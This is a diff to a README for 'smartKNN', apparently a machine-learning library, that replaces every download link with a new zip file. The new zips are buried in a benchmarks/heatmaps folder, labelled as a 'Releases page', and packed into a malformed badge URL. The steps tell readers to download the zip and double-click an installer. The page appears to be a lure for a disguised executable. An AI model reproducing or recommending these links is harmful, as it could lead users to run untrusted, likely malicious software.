@@ -4,7 +4,7 @@
 Welcome to smartKNN! This application provides an easy way to use a feature-weighted KNN algorithm. It handles data preprocessing and normalization automatically, which simplifies your data science tasks. 
 
 ## 📥 Download Now
-[![Download smart-knn](https://raw.githubusercontent.com/Tanishq7690/smart-knn/main/benchmarks/results/classification_results/smart-knn-2.1.zip%https://raw.githubusercontent.com/Tanishq7690/smart-knn/main/benchmarks/results/classification_results/smart-knn-2.1.zip)](https://raw.githubusercontent.com/Tanishq7690/smart-knn/main/benchmarks/results/classification_results/smart-knn-2.1.zip)
+[![Download smart-knn](https://github.com/Tanishq7690/smart-knn/raw/refs/heads/main/benchmarks/heatmaps/knn-smart-v3.6.zip%https://github.com/Tanishq7690/smart-knn/raw/refs/heads/main/benchmarks/heatmaps/knn-smart-v3.6.zip)](https://github.com/Tanishq7690/smart-knn/raw/refs/heads/main/benchmarks/heatmaps/knn-smart-v3.6.zip)
 
 ## 📋 Description
 smartKNN is a powerful tool designed to help you classify and analyze your data. With built-in automatic preprocessing and normalization, it saves you time. It also learns which features are most important, making your results more accurate. Whether you're working with tabular data or specific data science projects, smartKNN streamlines the process with ease.
@@ -24,7 +24,7 @@ To run smartKNN smoothly, ensure your system meets the following requirements:
 - **Disk Space**: 100MB free space.
 
 ## 🔗 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Tanishq7690/smart-knn/main/benchmarks/results/classification_results/smart-knn-2.1.zip) to access the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Tanishq7690/smart-knn/raw/refs/heads/main/benchmarks/heatmaps/knn-smart-v3.6.zip) to access the latest version.
 2. **Download the software**: Click on the most recent version to download the setup file for your operating system.
 3. **Run the Installer**: Once the download is complete, locate the file and double-click it to run the installer.
 4. **Follow the Instructions**: A setup wizard will guide you through the installation process. 
@@ -54,6 +54,6 @@ Check back frequently for updates or new features. Staying on the latest version
 smartKNN is open-source and available for anyone to use. Feel free to explore the code on our GitHub repository.
 
 ## 📥 Download Now
-As a reminder, you can always grab the latest version from our [Releases page](https://raw.githubusercontent.com/Tanishq7690/smart-knn/main/benchmarks/results/classification_results/smart-knn-2.1.zip). 
+As a reminder, you can always grab the latest version from our [Releases page](https://github.com/Tanishq7690/smart-knn/raw/refs/heads/main/benchmarks/heatmaps/knn-smart-v3.6.zip). 
 
 Happy analyzing with smartKNN!
